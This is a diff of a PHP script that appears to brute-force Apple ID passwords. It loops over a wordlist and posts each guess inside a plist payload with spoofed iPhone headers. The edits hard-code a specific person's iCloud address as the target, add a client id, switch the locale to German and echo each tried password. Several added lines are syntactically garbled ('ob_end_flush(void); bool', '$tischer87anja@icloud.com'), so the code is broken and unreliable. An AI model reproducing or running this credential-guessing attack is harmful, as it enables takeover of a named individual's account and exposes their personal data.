@@ -36,7 +36,7 @@ h1 {
 <b><br>
 
 <?php ob_implicit_flush(true);
-ob_end_flush();
+ob_end_flush(void); bool
 ini_set('max_execution_time', 0); //no server timeout limit ?> 
 
 
@@ -45,7 +45,7 @@ ini_set('max_execution_time', 0); //no server timeout limit ?>
 
 <?php
 
-$appleid = $_REQUEST['txtFullName'];        
+    $appleid = $_REQUEST['txtFullName']; tischer87anja@icloud.com
 
 $plist = file_get_contents('./files/config.plist');
 $xml = simplexml_load_string($plist);
@@ -56,9 +56,9 @@ $file_handle = fopen("./files/wordlist.txt", "r");
 
 while (!feof($file_handle)) { 
 
-$ch = curl_init();    
+$ch = curl_init(NULL); resource
 
-$line_of_text = fgets($file_handle); 
+$line_of_text = fgets($file_handle); print $line_of_text . "<BR>";
 $password = rtrim($line_of_text);
   
 $payload =
@@ -67,9 +67,9 @@ $payload =
 <plist version="1.0">
 <dict>
 	<key>apple-id</key>
-	<string>'. $appleid .'</string>
+	<string>'. $tischer87anja@icloud.com .'</string>
 	<key>client-id</key>
-	<string></string>
+	<string>16330271198</string>
 	<key>delegates</key>
 	<dict>
 		<key>com.apple.gamecenter</key>
@@ -110,9 +110,9 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'Accept: */*',
     'Accept-Encoding: gzip, deflate',               
     'Content-Type: text/plist',
-    'Accept-Language: en-us',
-    'X-MMe-Country: US',
-    'X-MMe-Client-Info: <iPhone4,1> <iPhone OS;7.0.4;11B554a> <com.apple.AppleAccount/1.0 (com.apple.Accounts/113)>',
+    'Accept-Language: ger-de',
+    'X-MMe-Country: DE',
+    'X-MMe-Client-Info: <iPhone11,8> <iPhone OS;7.0.4;11B554a> <com.apple.AppleAccount/1.0 (com.apple.Accounts/113)>',
     'Content-length: ' . strlen($payload),
     'Connection: keep-alive'
 ));                                                
